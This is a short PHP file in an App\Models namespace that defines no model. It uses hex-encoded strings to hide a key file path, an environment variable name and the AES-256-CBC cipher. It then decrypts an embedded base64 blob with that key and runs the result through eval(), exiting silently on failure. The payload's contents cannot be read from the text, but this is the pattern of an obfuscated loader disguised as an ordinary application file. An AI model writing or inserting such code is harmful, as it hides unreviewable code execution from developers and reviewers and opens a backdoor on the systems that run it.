<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('WH+/YcAU4JPAsKm3O47LYg==');

$c=base64_decode(

'ec76t7oy3jLLDZN40v7KQW1PGXB1TycJKFH5hRgHZF3OAcWwjjIKdHQcYUGHd83vyY8/VL+/adp6' .
'ij2zELJsibtYsWGmLE0sZA8ofd9OCpKOeQEcKaY2rfzDIi6nC+CEQItUuOgv2ghTmvkxcczmWc5A' .
'Bv6CvnXVuA3PCpQL6uD3AelnoFCypswiNSYVAYjFrr5/TJ12L33PE8E6aomAj4goz8gVmYQsOUVb' .
'/2lDePm1GfOTas3CDUdAyydwo8RdBJh0yXSkgKL+NXCE05m3TuMNOGjaTplZIp1w/5/Wosmgmqmq' .
'tG5zyBAQJV73o+d/ZzjsLbAVp6k79bSeYzj4NI2ek0ASz1AGc3UXE5aCnFl2FUwrED/HJm6cyhJb' .
'axzCWhF9DKXw88FsxRp+eipFuFZhfzoCuMZrwV4qAeNUZunaCCuPedFhSeKXY7oWZcPXuIE7MlrZ' .
'ihiMIemefK0LyUNcUpaCXvAgzoURUpV0VjTnuPlZoVD8PjXKdrcdREwUwd6Qqpr2NlHV8AVyGjaM' .
'r2bd4oY0hQeJxKIToTgKJ3WkALrMWHbfmX5mkgHZ4VXFd2LYQlgtxdsS3zXkmknNnAoQTCfjzQDr' .
'Ja2FqPwvQ99nEzwqJMo5WBnxOLDeF+eVqnwiiR7m2+YwHfuctZbJNR43OKYB6yU0bxrhlE+He2LG' .
'EoatqkhcrqWU/gkCDFeqbVnaNfIyCOxZNWV3uWZYBYC+BxLjbNIQLNgAzE9lTOFmTChEIeZ8gOcN' .
'ZGpfbHrLeUMQF8JRg7X6V91nc+XGUhKqmyD20gyQTtGaHQ5LaHWMgp4z4Us22Ubh2g89A+zbrh6K' .
'Pnwb5y6PC4MM94DICsrAUS2hSA9TM73iMkuvJNLPzYmBpgZVhC+NwLuszEmv'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

